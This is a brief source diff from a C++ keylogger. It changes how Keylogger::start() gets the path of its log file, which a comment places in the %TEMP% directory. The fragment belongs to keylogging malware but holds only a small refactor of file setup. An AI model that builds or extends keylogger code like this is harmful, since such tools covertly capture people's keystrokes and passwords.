@@ -120,7 +120,7 @@ void Keylogger::start() {
 
         // Create log file int %TEMP% directory
         const int buffSize = 1024;
-		this->logfilePath = Configuration::GetLogFilePath();
+		this->logfilePath = Configuration::LogFilePath;
 
         logFile.open(this->logfilePath, std::ios::app);
         this->isActive = true;
